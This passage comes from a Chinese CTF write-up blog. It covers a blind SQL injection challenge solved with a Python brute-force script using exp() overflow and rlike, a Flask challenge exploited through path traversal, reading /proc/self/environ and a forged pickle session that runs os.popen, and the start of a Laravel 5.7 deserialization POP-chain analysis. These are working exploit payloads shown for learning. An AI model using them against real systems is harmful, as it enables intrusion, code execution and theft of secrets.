下图是在本地复现，rlike可以匹配age中含有1的,返回1则为exp(709)不报错。<br><img src="https://img-blog.csdnimg.cn/20210506164455116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210506163137166.png" alt="在这里插入图片描述"><br>当匹配不到返回0则exp(710)报错<br><img src="https://img-blog.csdnimg.cn/20210506164538650.png" alt="在这里插入图片描述"></p><p>到这里题目思路就出来了</p><figure class="highlight py"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs py">&gt; - <span class="hljs-string">&#x27;username&#x27;</span> : <span class="hljs-string">&quot;admin\\&quot;</span>    转义单引号造成错误闭合<br>&gt; - <span class="hljs-string">&#x27;password&#x27;</span> : <span class="hljs-string">&quot;||exp(710-(code rlike binary ....))#&quot;</span> 其中空格用编码绕过（<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>)，引号用十六进制绕过<br>&gt; - <span class="hljs-string">&quot;code&quot;</span> : <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>题目限制了只有四个十六进制的数大小，则不能一个个爆破，但思路已经出来了，剩下就是写脚本了.<br>但是还有一个值得注意的问题就是因为rlike是对所有的进行匹配不是从开头，所以匹配过程中可能会出现多解，这个后面会说到</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">num_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#x27;</span>,<span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Huge num detected&#x27;</span>);<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transfer_to_hex</span>(<span class="hljs-params">num</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> num])<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    part = <span class="hljs-string">&#x27;erg&#x27;</span><br>    result = <span class="hljs-string">&#x27;erg&#x27;</span><br>    count = <span class="hljs-number">0</span><br>    temp = <span class="hljs-string">&#x27;&#x27;</span><br>    alphabet = string.digits + string.ascii_letters<br>    url = <span class="hljs-string">&#x27;http://4e2056fd-b5b8-4e3c-b3df-86d99baa43c9.node3.buuoj.cn&#x27;</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        temp = transfer_to_hex(part)<br>        count = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> alphabet:<br>            s = transfer_to_hex(j)<br>            payload = <span class="hljs-string">&quot;||exp(710-(code rlike binary 0x&quot;</span> + temp + s + <span class="hljs-string">&quot;))#&quot;</span><br>            payload = payload.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))<br>            <span class="hljs-comment"># print(payload)</span><br>            data = &#123;<br>                <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin\\&quot;</span>,<br>                <span class="hljs-string">&quot;password&quot;</span>: payload,<br>                <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>            &#125;<br>            res = requests.post(url + <span class="hljs-string">&quot;/login.php&quot;</span>, data=data, allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-comment"># print(req.text)</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;fail&#x27;</span> <span class="hljs-keyword">in</span> res.text):<br>                count = count + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> count &gt; <span class="hljs-number">1</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1: &quot;</span> + result )<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2: &quot;</span> + result[:-<span class="hljs-number">1</span>] + j)<br>                <span class="hljs-keyword">else</span>:<br>                    part = part[<span class="hljs-number">1</span>:] + j<br>                    result = result + j<br>                    <span class="hljs-built_in">print</span>(result)<br>                    <span class="hljs-comment"># print(part)</span><br>exp()<br><span class="hljs-comment"># ||exp(710-(code rlike binary 0x65726730))#</span><br><span class="hljs-comment"># ||exp(710-(code|rlike|binary|0x65))#</span><br></code></pre></div></td></tr></table></figure><p>这个地方要先跑出前几个字符<br><img src="https://img-blog.csdnimg.cn/20210506175331227.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210506175347610.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021050617540682.png" alt="在这里插入图片描述"><br>然后用前三个第四个，第四个推第五个以此类推，但这里确实出现了多解，交换数字字母表的顺序会跑出来两种结果<br><img src="https://img-blog.csdnimg.cn/20210506181237183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210506181714835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>仔细观察一下第一种结果后面形成了一种死循环则gh2u应该在gh23前面，则可以推测出code最终为</p><ul><li>erghruigh2uygh23uiu32ig<br>最后用admin\账号登录 密码用||1# 验证码用erghruigh2uygh23uiu32ig即可获得flag<br><img src="https://img-blog.csdnimg.cn/20210506183812271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><ul><li>总结一下：注入真的博大精深，多积累这些方法吧</li></ul>]]></content>
    
    
    <categories>
      
      <category>buu刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>BUU</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HFCTFeasyflask</title>
    <link href="/2021/05/04/2021-5-4-%5BHFCTF%5Dezsyflask/"/>
    <url>/2021/05/04/2021-5-4-%5BHFCTF%5Dezsyflask/</url>
    
    <content type="html"><![CDATA[<h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><h4 id="按提示找到源码"><a href="#按提示找到源码" class="headerlink" title="- 按提示找到源码"></a>- 按提示找到源码</h4><h4 id="找到secret-key"><a href="#找到secret-key" class="headerlink" title="- 找到secret key"></a>- 找到secret key</h4><h4 id="构造反序列化伪造cookie"><a href="#构造反序列化伪造cookie" class="headerlink" title="- 构造反序列化伪造cookie"></a>- 构造反序列化伪造cookie</h4><hr><h2 id="找源码"><a href="#找源码" class="headerlink" title="找源码"></a>找源码</h2><p>这个按题目提示构造/file?file=/app/source即可得到源码</p><h2 id="找secret-key"><a href="#找secret-key" class="headerlink" title="找secret key"></a>找secret key</h2><p>审计源码到这发现有一个黑名单过滤，并且有一个路径拼接，看到这里显然可以想到读取任意文件，百度了一下os.path.jpin()函数发现有漏洞</p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">os.path.<span class="hljs-keyword">join</span>()函数用于路径拼接文件路径。<br>os.path.<span class="hljs-keyword">join</span>()函数中可以传入多个路径：<br><br>会从第一个以”/”开头的参数开始拼接，之前的参数全部丢弃。<br><br>以上一种情况为先。在上一种情况确保情况下，若出现”.<span class="hljs-regexp">/”开头的参数，会从”./</span>”开头的参数的上一个参数开始拼接。<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210504125249732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之后直接输路径就行最开始我读的是/etc/passwd,/etc/profile，后来发现都没啥作用，最后才发现还有一个程序的环境变量/proc文件夹，对于/proc文件的解释如下</p><figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm">/<span class="hljs-meta">proc</span>文件系统下的多种文件提供的系统信息不是针对某个特定进程的，而是能够在整个系统范围的上下文中使用。可以使用的文件随系统<br>配置的变化而变化。命令procinfo能够显示基于其中某些文件的多种系统信息。以下详细描述/<span class="hljs-meta">proc</span>下的文件。 <br><br>/<span class="hljs-meta">proc</span>文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。用户和<br>应用程序可以通过 <span class="hljs-meta">proc</span>得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取pr<br><span class="hljs-symbol">oc</span>文件时，<span class="hljs-meta">proc</span>文件系统是 动态从系统内核读出所需信息并提交的。<br></code></pre></div></td></tr></table></figure><p>最后读/proc/self/environ可得到secret key<br><img src="https://img-blog.csdnimg.cn/20210504130045223.png" alt="在这里插入图片描述"></p><h2 id="构造反序列化伪造cookie-1"><a href="#构造反序列化伪造cookie-1" class="headerlink" title="构造反序列化伪造cookie"></a>构造反序列化伪造cookie</h2><p>直接将代码复制下来改一下user类本地跑一下session</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3.6</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, session<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;</span><br><br><span class="hljs-comment"># User = type(&#x27;User&#x27;, (object,), &#123;</span><br><span class="hljs-comment">#     &#x27;uname&#x27;: &#x27;test&#x27;,</span><br><span class="hljs-comment">#     &#x27;is_admin&#x27;: 1,</span><br><span class="hljs-comment">#     &#x27;__repr__&#x27;: lambda o: o.uname,</span><br><span class="hljs-comment">#     &#x27;__reduce__&#x27;: (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag` &gt; /tmp/111&#x27;).read()&quot;,)),</span><br><span class="hljs-comment"># &#125;)</span><br><span class="hljs-comment"># def __reduce__(self):</span><br><span class="hljs-comment">#     # os.system(&#x27;ls &gt; /1.txt&#x27;)</span><br><span class="hljs-comment">#     # cmd = &quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag` &gt; /tmp/111&#x27;).read()&quot;</span><br><span class="hljs-comment">#     return (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag` &gt; /tmp/111&#x27;).read()&quot;,))</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span>:</span><br>    uname = <span class="hljs-string">&#x27;aaa&#x27;</span><br>    is_admin = <span class="hljs-number">1</span><br>    __repr__: <span class="hljs-keyword">lambda</span> o: o.uname<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag` &gt; /tmp/111&#x27;).read()&quot;</span>,))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index_handler</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;u&#x27;</span>):<br>        u = pickle.dumps(User())<br>        session[<span class="hljs-string">&#x27;u&#x27;</span>] = u<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/file?file=index.js&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">file_handler</span>():</span><br>    path = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    path = os.path.join(<span class="hljs-string">&#x27;static&#x27;</span>, path)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path) <span class="hljs-keyword">or</span> os.path.isdir(path) \<br>            <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.py&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.sh&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> path:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;disallowed&#x27;</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>        content = fp.read()<br>    <span class="hljs-keyword">return</span> content<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">admin_handler</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        u = session.get(<span class="hljs-string">&#x27;u&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(u, <span class="hljs-built_in">dict</span>):<br>            u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))<br>        u = pickle.loads(u)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;uhh?&#x27;</span><br><br>    <span class="hljs-keyword">if</span> u.is_admin == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome, admin&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;who are you?&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210504130220724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将session复制到原环境即可，正常成功的话再访问/admin应该返回500<br><img src="https://img-blog.csdnimg.cn/20210504130320450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>总结一下：主要考点在于对flask的session机制的了解，对session伪造的掌握，还有要知道secrey key一般存放在环境变量的哪个文件夹，以及对python反序列化攻击的掌握.</p>]]></content>
    
    
    <categories>
      
      <category>buu刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>BUU</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>laravel5.7漏洞复现</title>
    <link href="/2021/04/30/2021-4.30-laravel5.7%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/04/30/2021-4.30-laravel5.7%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h3><ul><li>laravel环境搭建</li></ul><ul><li>pop链分析</li></ul><ul><li>构造反序列化payload<h2 id="laravel环境搭建"><a href="#laravel环境搭建" class="headerlink" title="laravel环境搭建"></a>laravel环境搭建</h2>这个不用多说了，网上很多大佬都写过很详细的博客，可以借鉴<h2 id="pop链分析"><a href="#pop链分析" class="headerlink" title="pop链分析"></a>pop链分析</h2>laravel5.7漏洞主要利用vendor/laravel/framework/src/Illuminate/Foundation/Testing文件夹下的一个PendingCommand类，该类中有几个私有特性<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;           <span class="hljs-comment">//一个实例化的类 Illuminate\Auth\GenericUser</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;         <span class="hljs-comment">//一个实例化的类 Illuminate\Foundation\Application</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$command</span>;     <span class="hljs-comment">//要执行的php函数 system</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;  <span class="hljs-comment">//要执行的php函数的参数  array(&#x27;id&#x27;)</span><br></code></pre></div></td></tr></table></figure></li><li>用于命令执行的函数为PendingCommand.php中的run()函数<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;hasExecuted = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">$this</span>-&gt;mockConsoleOutput();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-variable">$exitCode</span> = <span class="hljs-keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="hljs-keyword">$this</span>-&gt;command, <span class="hljs-keyword">$this</span>-&gt;parameters);<br>        &#125; <span class="hljs-keyword">catch</span> (NoMatchingExpectationException <span class="hljs-variable">$e</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$e</span>-&gt;getMethodName() == <span class="hljs-string">&#x27;askQuestion&#x27;</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;test-&gt;fail(<span class="hljs-string">&#x27;Unexpected question &quot;&#x27;</span>.<span class="hljs-variable">$e</span>-&gt;getActualArguments()[<span class="hljs-number">0</span>]-&gt;getQuestion().<span class="hljs-string">&#x27;&quot; was asked.&#x27;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;expectedExitCode != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;test-&gt;assertTrue(<br>                <span class="hljs-variable">$exitCode</span> == <span class="hljs-keyword">$this</span>-&gt;expectedExitCode,<br>                <span class="hljs-string">&quot;Expected status code <span class="hljs-subst">&#123;$this-&gt;expectedExitCode&#125;</span> but received <span class="hljs-subst">&#123;$exitCode&#125;</span>.&quot;</span><br>            );<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$exitCode</span>;<br>    &#125;<br></code></pre></div></td></tr></table></figure>还有可以触发run函数的析构函数<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;hasExecuted) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">$this</span>-&gt;run();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li>简单思路 构造反序列化调用析构函数，进入run方法进行代码执行观察run方法会进入第一个函数<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;mockConsoleOutput();<br></code></pre></div></td></tr></table></figure>跟进发现<br><img src="https://img-blog.csdnimg.cn/20210430125300802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里moke了一个虚拟的实例化类用于调试输出，具体实现也没看懂，直接跳过，中途发现有个foreach循环，这里对$this-&gt;test类的expectedOutput属性进行遍历作为数组，代码才能正常执行下去。但是该类并不存在expectedOutput属性；经过分析代码，我们发现这里只要能够返回一个数组代码就可以顺利进行下去。此时可以利用利用__get方法，因为读取不可访问属性的值时，__get() 会被调用。<br>经过全局搜索发现Illuminate\Auth\GenericUser类的get方法可利用，通过geet方法传入一个数组即可保证后面的代码顺利执行<br><img src="https://img-blog.csdnimg.cn/20210430130551168.png" alt="在这里插入图片描述"></li><li>后面的代码都是可以顺利执行下去的，接下来我们又回到了mockConsoleOutput()方法内，接下来又是一个forearch循环，如上一步的遍历数组一样，顺利执行下去</li><li>接下来代码会执行到$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);，其中Kernel::class为固定值”Illuminate\Contracts\Console\Kernel”<br>进入make方法后看到此时abstract参数是Illuminate\Contracts\Http\Kernel继续跟进getAlias<br><img src="https://img-blog.csdnimg.cn/20210430115658207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后判断aliases中的Illuminate\Contracts\Http\Kernel类是否存在并返回这个类名<br><img src="https://img-blog.csdnimg.cn/20210430120040909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>顺利执行完getAlias后回到make中最后会调用父类中的make函数，跟进父类中的make函数<br><img src="https://img-blog.csdnimg.cn/20210430120603552.png" alt="在这里插入图片描述"><br>跟进resolve函数<br><img src="https://img-blog.csdnimg.cn/20210430120955181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其中<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;instances[<span class="hljs-variable">$abstract</span>];=<span class="hljs-keyword">$this</span>-&gt;instances[<span class="hljs-string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>];<br></code></pre></div></td></tr></table></figure>也就是返回了Illuminate\Foundation\Application对象；即我们可以将任意对象赋值给 $this-&gt;instances[$abstract] ，这个对象最终会赋值给[Kernel::class]最后会进入到getconcret函数.<br><img src="https://img-blog.csdnimg.cn/20210430120816118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" 